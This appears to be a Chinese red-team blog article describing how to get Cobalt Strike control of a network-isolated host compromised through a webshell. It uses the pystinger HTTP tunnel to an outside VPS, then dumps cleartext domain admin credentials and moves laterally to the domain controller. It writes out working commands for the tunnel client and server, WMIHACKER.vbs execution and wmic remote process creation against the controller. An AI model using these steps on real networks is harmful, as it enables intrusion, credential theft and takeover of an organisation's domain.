##  [不出网的内网域渗透] 如何基于 http 隧道使用 pystinger 上线不出网机器到 CobaltStrike？

原创 渗透攻击红队  [ 渗透攻击红队 ](javascript:void\(0\);)

**渗透攻击红队** ![]()

微信号 RedTeamHacker

功能介绍 一个专注于渗透红队攻击的公众号

____

__

收录于话题

#内网渗透 13

#红队攻击 44

#域内渗透 30

#工具使用 18

渗透攻击红队

一个专注于红队攻击的公众号

![](https://gitee.com/fuli009/images/raw/master/public/20210806181644.png)  
  

大家好，这里是  **渗透攻击红队** ** ** 的第 **68**
篇文章，本公众号会记录一些红队攻击的案例，不定时更新！请勿利用文章内的相关技术从事非法测试，如因此产生的一切不良后果与文章作者和本公众号无关！

  

当跳板机器出网的情况下，我们可以随意内网渗透，只需注意免杀问题，那如何拿到一个 Webshell 不出网的情况下，如何进目标内网？如何上线到 C2？

  

 **不出网的内网域渗透**

##

 **前言**

  

首先是拿到了一个 Webshell：

![](https://gitee.com/fuli009/images/raw/master/public/20210806181645.png)

通过初步判断当前机器 icmp 不出网：

![]()

那怎么办呢？我们可以基于 HTTP 隧道打！  

  

 **基于 HTTP 隧道上线到 CobaltStrike**

  

项目地址：https://github.com/FunnyWolf/pystinger

这个东东可以让 Webshell 实现内网 Socks4 代理，让不出网机器上线到 MSF/CS，使用 python 写的一款工具，支持目标站点
php、jsp（x）、aspx 三种脚本语言！

先上传对应的 Pystinger webshell 文件并成功访问：  

![](https://gitee.com/fuli009/images/raw/master/public/20210806181646.png)

然后我们还需要将 stinger_server.exe 上传到目标服务器 ，执行如下命令：  

  * 

    
    
    start c:\Windows\temp\cookie\stinger_server.exe 0.0.0.0

![](https://gitee.com/fuli009/images/raw/master/public/20210806181647.png)

然后将 stinger_client 上传到 vps ，执行如下命令  

  * 

    
    
    ./stinger_client -w http://saulgoodman.cn:9009//wls-wsat/proxy.jsp -l 0.0.0.0 -p 60000

![](https://gitee.com/fuli009/images/raw/master/public/20210806181648.png)

此时已将目标服务器的 60020 端口映射到 VPS 的 60020 端口了！  

这个时候我们 CobaltStrike 设置监听，http host 填写目标内网的  IP 地址：192.168.0.9，端口填写 60020:  

![](https://gitee.com/fuli009/images/raw/master/public/20210806181649.png)

![](https://gitee.com/fuli009/images/raw/master/public/20210806181650.png)

然后我们生成一个 exe，监听器就是刚刚设置的那个：  

![](https://gitee.com/fuli009/images/raw/master/public/20210806181651.png)

然后目标运行 exe 马，直接上线到 CobaltStrike：  

![](https://gitee.com/fuli009/images/raw/master/public/20210806181652.png)

  

 **内网信息搜集**

  

通过 nbtscan 对当前内网进行信息搜集发现当前内网是存在域环境的：

![](https://gitee.com/fuli009/images/raw/master/public/20210806181653.png)

由于当前已经是 administrator 了，且是 Windows 2008 的机器，可以直接抓明文：

![](https://gitee.com/fuli009/images/raw/master/public/20210806181654.png)

抓到了本地管理员和域管明文还有一些域用户的明文！既然域控是 192.168.0.2 这台，那么直接 WMI 横向把：

  * 

    
    
    shell cscript  c:\windows\temp\WMIHACKER.vbs /cmd 192.168.0.2 BExxxx\administrator vmxxxxx whoami 1

![](https://gitee.com/fuli009/images/raw/master/public/20210806181655.png)

直接拿到域控 system 权限！我们还可以用系统自带的 WMI 来执行命令，只不过命令不回显：

  *   *   * 

    
    
    wmic /node:192.168.0.2 /user:BEHxxxx\administrator /password:vm$xxxx process call create "cmd.exe /c ipconfig > c:\result.txt"            type \\192.168.0.2\c$\result.txt

![](https://gitee.com/fuli009/images/raw/master/public/20210806181656.png)

这篇文章主要就是想表达不出网也是可以对它进行内网渗透的，并不是遇到不出网环境就不能打内网，方法很多，知识面还是会决定你的杀伤链！

  

![](https://gitee.com/fuli009/images/raw/master/public/20210806181657.png)  

渗透攻击红队

一个专注于渗透红队攻击的公众号

![](https://gitee.com/fuli009/images/raw/master/public/20210806181658.png)

  

  

![]()点分享![](https://gitee.com/fuli009/images/raw/master/public/20210806181659.png)点点赞![]()点在看

预览时标签不可点

收录于话题 #

个 __

上一篇 下一篇

阅读

分享 收藏

赞 在看

____已同步到看一看[写下你的想法](javascript:;)

前往“发现”-“看一看”浏览“朋友在看”

![](//res.wx.qq.com/mmbizwap/zh_CN/htmledition/images/pic/appmsg/pic_like_comment55871f.png)

前往看一看

**看一看入口已关闭**

在“设置”-“通用”-“发现页管理”打开“看一看”入口

[我知道了](javascript:;)

__

已发送

取消 __

####  发送到看一看

发送

[不出网的内网域渗透] 如何基于 http 隧道使用 pystinger 上线不出网机器到 CobaltStrike？

最多200字，当前共字

__

发送中

写下你的留言

微信扫一扫  
关注该公众号

微信扫一扫  
使用小程序

****

[取消](javascript:void\(0\);) [允许](javascript:void\(0\);)

****

[取消](javascript:void\(0\);) [允许](javascript:void\(0\);)

[知道了](javascript:;)

**长按识别前往小程序**

![]()

